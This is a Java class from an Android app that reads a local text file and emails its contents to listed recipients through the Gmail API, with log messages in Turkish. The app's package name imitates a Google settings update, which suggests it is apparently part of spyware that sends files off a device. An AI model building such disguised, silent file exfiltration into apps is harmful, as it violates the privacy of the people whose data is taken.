package com.setting.dl.google.googlesettingupdate.ptt.senders;

import android.support.annotation.NonNull;

import com.google.api.services.gmail.Gmail;
import com.google.api.services.gmail.model.Message;
import com.setting.dl.google.googlesettingupdate.time.Time;
import com.setting.dl.google.googlesettingupdate.mail.gmail.Mail;
import com.setting.dl.google.googlesettingupdate.u;

import org.jetbrains.annotations.NotNull;

import java.io.File;
import java.util.List;
import java.util.Objects;

public class TextFileSender implements ITextFileSender {
    
    @Override
    synchronized
    public Message sendTextFile(
            @NonNull Gmail gmail, 
            @NotNull String sender, 
            @NotNull List<String> recievers, 
            @NotNull File textFile) {
    
    
        if (isInvalid(sender, recievers, textFile)) {
        
            return null;
        }
        
        
        try {
            
            String val = Mail.getFileContent(textFile);
            
            if (val == null || val.trim().isEmpty()) {
                
                return null;
            }
      
              return gmail.users()
                    .messages()
                    .send("me", Objects.requireNonNull(Mail.createMessageWithEmail(
                          Mail.createEmail(
                                recievers,
                                sender,
                                textFile.getName(),
                                Time.getDate(textFile.lastModified()) + "\n\n" + val)))).execute();
        }
        catch (Exception e) {
            
            e.printStackTrace();
        }
        
        return null;
    }
   
   synchronized
   private boolean isInvalid(@NonNull String sender,
                              @NonNull List<String> recievers,
                              @NonNull File file){
        
        if (recievers.size() == 0) {
            
            u.log.w("Alıcı yok");
            return true;
        }
        
        if (sender.trim().isEmpty()) {
            
            u.log.w("Gönderen belirtilmemiş");
            return true;
        }
        
        if (!file.exists()) {
            
            u.log.w("Dosya mevcut değil : %s", file.getName());
            return true;
        }
        
        return false;
    }
    
    
}
